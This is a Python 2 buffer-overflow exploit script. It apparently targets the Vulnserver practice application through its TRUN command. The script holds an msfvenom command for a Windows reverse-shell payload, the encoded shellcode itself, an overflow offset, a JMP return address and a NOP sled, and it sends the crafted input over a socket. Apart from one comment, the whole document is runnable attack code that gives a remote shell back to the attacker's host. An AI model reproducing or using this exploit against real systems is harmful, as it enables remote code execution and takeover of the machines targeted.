#msfvenom -p windows/shell_reverse_tcp LHOST=1.1.1.1 LPORT=443 -f c -a x86 EXITFUNC=thread --platform windows -e x86/shikata_ga_nai
#!/usr/bin/python
import sys, socket
from time import sleep

overflow = ("\xbf\xef\xc4\x79\x7a\xdb\xc8\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x5b\x83\xc5\x04\x31\x7d\x10\x03\x7d\x10\x0d\x31\x85\x92\x53"
"\xba\x76\x63\x33\x32\x93\x52\x73\x20\xd7\xc5\x43\x22\xb5\xe9"
"\x28\x66\x2e\x79\x5c\xaf\x41\xca\xea\x89\x6c\xcb\x46\xe9\xef"
"\x4f\x94\x3e\xd0\x6e\x57\x33\x11\xb6\x85\xbe\x43\x6f\xc2\x6d"
"\x74\x04\x9e\xad\xff\x56\x0f\xb6\x1c\x2e\x2e\x97\xb2\x24\x69"
"\x37\x34\xe8\x02\x7e\x2e\xed\x2e\xc8\xc5\xc5\xc5\xcb\x0f\x14"
"\x26\x67\x6e\x98\xd5\x79\xb6\x1f\x05\x0c\xce\x63\xb8\x17\x15"
"\x19\x66\x9d\x8e\xb9\xed\x05\x6b\x3b\x22\xd3\xf8\x37\x8f\x97"
"\xa7\x5b\x0e\x7b\xdc\x60\x9b\x7a\x33\xe1\xdf\x58\x97\xa9\x84"
"\xc1\x8e\x17\x6b\xfd\xd1\xf7\xd4\x5b\x99\x1a\x01\xd6\xc0\x72"
"\xe6\xdb\xfa\x82\x60\x6b\x88\xb0\x2f\xc7\x06\xf9\xb8\xc1\xd1"
"\x88\xae\xf1\x0e\x32\xbe\x0f\xaf\x43\x97\xcb\xfb\x13\x8f\xfa"
"\x83\xff\x4f\x02\x56\x95\x45\x94\x99\xc2\x58\x94\x72\x11\x5a"
"\x45\xdf\x9c\xbc\x35\x8f\xce\x10\xf6\x7f\xaf\xc0\x9e\x95\x20"
"\x3f\xbe\x95\xea\x28\x55\x7a\x43\x01\xc2\xe3\xce\xd9\x73\xeb"
"\xc4\xa4\xb4\x67\xed\x59\x7a\x80\x84\x49\x6b\xf7\x66\x91\x6c"
"\x92\x66\xfb\x68\x34\x30\x93\x72\x61\x76\x3c\x8c\x44\x04\x3a"
"\x72\x19\x3d\x31\x45\x8f\x01\x2d\xaa\x5f\x82\xad\xfc\x35\x82"
"\xc5\x58\x6e\xd1\xf0\xa6\xbb\x45\xa9\x32\x44\x3c\x1e\x94\x2c"
"\xc2\x79\xd2\xf2\x3d\xac\x60\xf4\xc2\x33\x4f\x5d\xab\xcb\xcf"
"\x5d\x2b\xa1\xcf\x0d\x43\x3e\xff\xa2\xa3\xbf\x2a\xeb\xab\x4a"
"\xbb\x59\x4d\x4b\x96\x3c\xd3\x4c\x15\xe5\xe4\x37\x56\x1a\x05"
"\xc8\x7e\x7f\x05\xc9\x7e\x81\x39\x1c\x47\xf7\x7c\x9d\xfc\x18"
"\x63\x0b\x09\xb1\x3a\xde\xb0\xdc\xbc\x35\xf6\xd8\x3e\xbf\x87"
"\x1e\x5e\xca\x82\x5b\xd8\x27\xff\xf4\x8d\x47\xac\xf5\x87")

jmp_address = "\xaf\x11\x50\x62"
buffer = "A" * 2003
shellcode = buffer + jmp_address + "\x90" * 32 + overflow
ip = "1.1.1.1" #Change this
port = 9999

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(('TRUN /.:/' + shellcode))
    s.close
except:
    print "Server error"
    sys.exit()
